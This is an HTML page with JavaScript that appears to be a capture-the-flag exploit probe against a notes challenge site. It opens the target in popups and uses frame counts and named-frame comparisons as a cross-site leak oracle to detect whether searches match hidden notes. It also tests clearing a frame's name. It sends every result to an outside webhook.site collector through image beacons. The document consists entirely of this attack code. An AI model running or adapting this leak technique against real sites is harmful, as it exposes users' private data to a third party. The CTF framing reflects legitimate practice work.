<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
var CHALL = 'https://notes.chall.lac.tf';
var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';

function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
function log(m) { document.getElementById('log').textContent += m + '\n'; }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

async function run() {
  ping('v14_start');

  // === T1: Comparison oracle - MATCH (no search = all notes shown) ===
  // With name=adf on ads, check popup[0] === popup['adf']
  // Nomatch: always true. Match: false when note is at index 0 (~1/N chance)
  log('T1: comparison oracle - match');
  var matchUrl = CHALL + '/?name=x&referrerPolicy=adf';
  var w = window.open(matchUrl);
  await sleep(1500);
  var matchRes = [];
  for (var i = 0; i < 20; i++) {
    try {
      var named = w['adf'];
      if (!named) { matchRes.push('N'); }
      else {
        var eq = (w[0] === named) ? 'T' : 'F';
        matchRes.push(w.length + eq);
      }
    } catch(e) { matchRes.push('E'); }
    w.location = matchUrl;
    await sleep(700);
  }
  w.close();
  ping('t1_match=' + matchRes.join(','));
  log('T1 done: ' + matchRes.join(','));
  await sleep(300);

  // === T2: Comparison oracle - NOMATCH ===
  log('T2: comparison oracle - nomatch');
  var nomatchUrl = CHALL + '/?name=x&referrerPolicy=adf&search=zzzzzzz';
  w = window.open(nomatchUrl);
  await sleep(1500);
  var nomatchRes = [];
  for (var i = 0; i < 20; i++) {
    try {
      var named = w['adf'];
      if (!named) { nomatchRes.push('N'); }
      else {
        var eq = (w[0] === named) ? 'T' : 'F';
        nomatchRes.push(w.length + eq);
      }
    } catch(e) { nomatchRes.push('E'); }
    w.location = nomatchUrl;
    await sleep(700);
  }
  w.close();
  ping('t2_nomatch=' + nomatchRes.join(','));
  log('T2 done: ' + nomatchRes.join(','));
  await sleep(300);

  // === T3: Name clearing via window.open ===
  log('T3: name clearing test');
  w = window.open(matchUrl);
  await sleep(1500);
  var t3 = {};
  try {
    t3.len = w.length;
    // Can window.open find the named frame?
    var o = window.open('about:blank', 'adf');
    t3.gotRef = o ? 'yes' : 'no';
    await sleep(200);
    // Test cross-origin access
    try { t3.oLen = o.length; } catch(e) { t3.oLen = 'E'; }
    try { t3.oName = o.name; } catch(e) { t3.oName = 'E'; }
    // Try setting name
    try { o.name = ''; t3.setName = 'ok'; } catch(e) { t3.setName = 'E'; }
    await sleep(100);
    // Did it work? Check if popup['adf'] changed
    t3.adfStill = w['adf'] ? 'yes' : 'no';
    // Is the reference the same or different?
    try {
      var o2 = w['adf'];
      t3.sameRef = (o2 === o) ? 'same' : 'diff';
    } catch(e) { t3.sameRef = 'E'; }
    t3.lenAfter = w.length;
  } catch(e) { t3.err = e.message.substring(0, 40); }
  w.close();
  ping('t3=' + JSON.stringify(t3));
  log('T3: ' + JSON.stringify(t3));

  ping('v14_done');
  log('Done!');
}
run();
</script>
</body>
</html>
